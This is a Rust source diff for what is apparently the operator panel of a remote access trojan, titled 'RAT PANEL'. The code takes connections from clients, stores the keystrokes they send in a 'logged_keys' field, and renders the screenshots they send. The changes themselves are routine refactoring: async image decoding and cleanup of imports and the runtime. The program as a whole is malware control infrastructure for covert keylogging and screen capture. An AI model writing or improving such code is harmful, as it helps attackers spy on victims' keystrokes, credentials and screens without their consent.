@@ -4,10 +4,10 @@ mod ui;
 mod server;
 
 use app::App;
-use color_eyre::Result;
 use std::error::Error;
 use std::io;
 use std::time::{Duration, Instant};
+use std::io::Cursor;
 
 use crossterm::event::{self, DisableMouseCapture, EnableMouseCapture, KeyCode, Event, EventStream};
 use crossterm::execute;
@@ -23,6 +23,7 @@ use ratatui_image::{
 };
 
 use image::ImageReader;
+use color_eyre::Result;
 use futures::{FutureExt, StreamExt};
 
 use crate::server::ClientEvent;
@@ -35,22 +36,24 @@ fn handle_request(app: &mut App, request: ResizeRequest) -> Result<()> {
 
 fn handle_client_event(app: &mut App, event: ClientEvent) -> Result<(), Box<dyn Error>> {
     match event {
-        ClientEvent::Connected(addr) => { app.addr = addr.to_string() },
-        ClientEvent::Data(bytes) => { app.logged_keys.push_str(std::str::from_utf8(&bytes)?); }  
-        ClientEvent::Disconnected => { app.addr = String::new() },
+        ClientEvent::Connected(addr) => app.addr = addr.to_string(),
+        ClientEvent::Data(bytes) => app.logged_keys.push_str(std::str::from_utf8(&bytes)?),
+        ClientEvent::Disconnected => app.addr = String::new(),
     }
     Ok(())
 }
 
-fn handle_client_img_event(app: &mut App, event: ClientEvent) -> Result<(), Box<dyn Error>> {
+async fn handle_client_img_event(app: &'_ mut App<'_>, event: ClientEvent) -> Result<(), Box<dyn Error>> {
     match event {
-        ClientEvent::Connected(addr) => { app.img_addr = addr.to_string() },
+        ClientEvent::Connected(addr) => app.img_addr = addr.to_string(),
         ClientEvent::Data(bytes) => { 
-            let image = ImageReader::new(
-                std::io::Cursor::new(bytes)
-            )
-            .with_guessed_format()?
-            .decode()?;
+            let image = tokio::task::spawn_blocking(move || {
+                ImageReader::new(
+                    Cursor::new(bytes)
+                )
+                .with_guessed_format()?
+                .decode()
+            }).await??;
 
             let protocol = Picker::from_query_stdio()?
                 .new_resize_protocol(image);
@@ -58,7 +61,7 @@ fn handle_client_img_event(app: &mut App, event: ClientEvent) -> Result<(), Box<
             let tx_clone = app.tx.clone();
             app.screenshot = ThreadProtocol::new(tx_clone, Some(protocol))
         }  
-        ClientEvent::Disconnected => { app.img_addr = String::new() },
+        ClientEvent::Disconnected => app.img_addr = String::new(),
     }
     Ok(())
 }
@@ -88,8 +91,8 @@ pub async fn run(tick_rate: Duration) -> Result<(), Box<dyn Error>> {
     let backend = CrosstermBackend::new(stdout);
     let mut terminal = Terminal::new(backend)?;
 
-    let app = App::new(" ◈ RAT PANEL ");
-    let app_result = run_app(&mut terminal, app.await, tick_rate).await;
+    let app = App::new(" ◈ RAT PANEL ").await;
+    let app_result = run_app(&mut terminal, app, tick_rate).await;
 
     disable_raw_mode()?;
     execute!(
@@ -122,7 +125,7 @@ where
         tokio::select! {
             Some(request) = app.rx.recv() => handle_request(&mut app, request)?,
             Some(client_event) = app.client.app_receiver.recv() => handle_client_event(&mut app, client_event)?,
-            Some(client_img_event) = app.client.app_img_receiver.recv() => handle_client_img_event(&mut app, client_img_event)?,
+            Some(client_img_event) = app.client.app_img_receiver.recv() => handle_client_img_event(&mut app, client_img_event).await?,
             Some(event) = event_stream.next().fuse() => handle_app_event(&mut app, event).await?,
         }
 
@@ -137,9 +140,6 @@ where
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn Error>> {
-    let rt = tokio::runtime::Runtime::new()?;
-    let _guard = rt.enter();
-
     let tick_rate = Duration::from_millis(250);
     run(tick_rate).await?;
     Ok(())
